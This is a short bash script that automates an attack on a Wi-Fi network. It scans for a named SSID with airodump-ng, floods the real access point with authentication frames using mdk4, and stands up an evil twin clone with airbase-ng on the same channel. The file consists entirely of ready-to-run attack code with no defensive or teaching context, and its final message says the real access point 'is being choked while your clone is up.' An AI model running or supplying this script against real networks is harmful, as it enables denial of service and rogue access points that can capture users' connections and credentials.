#!/bin/bash

# --- 1. Configuration ---
read -p "Enter Interface (e.g., wlan0mon): " IFACE
read -p "Enter Target SSID: " SSID

# --- 2. Automated Scanner Logic ---
# Logic: We scan briefly to grab the BSSID and Channel automatically
echo "[*] Scanning for $SSID..."
rm -f /tmp/shabang-01.csv
xterm -geometry 100x24 -e "sudo airodump-ng $IFACE --band g -w /tmp/shabang --output-format csv" &
SCAN_PID=$!

# Wait for file creation
while [ ! -f /tmp/shabang-01.csv ]; do sleep 1; done
sleep 10 # Give it time to find the target
kill $SCAN_PID

# Parse target info
BSSID=$(grep "$SSID" /tmp/shabang-01.csv | awk -F, 'NR==1 {print $1}' | tr -d ' ')
CH=$(grep "$SSID" /tmp/shabang-01.csv | awk -F, 'NR==1 {print $4}' | tr -d ' ')

if [ -z "$BSSID" ]; then
    echo "[-] Target not found. Logic failed."
    exit 1
fi

echo "[+] Found $SSID at $BSSID on Channel $CH"

# --- 3. The Attack (The Shabang) ---
# Lock the card to the channel so the flood and AP stay in sync
sudo iw dev $IFACE set channel $CH

# Window 1: The CPU Crusher (SAE Flood)
# Using mdk4 because it's more efficient than Scapy for high-speed flooding
xterm -T "SAE FLOOD" -e "sudo mdk4 $IFACE a -a $BSSID -m -s 1000" &

# Window 2: The Evil Twin (airbase-ng)
# This creates the 'Trap' on the same channel
xterm -T "EVIL TWIN" -e "sudo airbase-ng -e '$SSID' -c $CH $IFACE" &

# Window 3: Fallout Monitor
xterm -T "MONITOR" -e "sudo airodump-ng --bssid $BSSID --channel $CH $IFACE" &

echo "[!] Attack active on 1 card. The real AP is being choked while your clone is up."
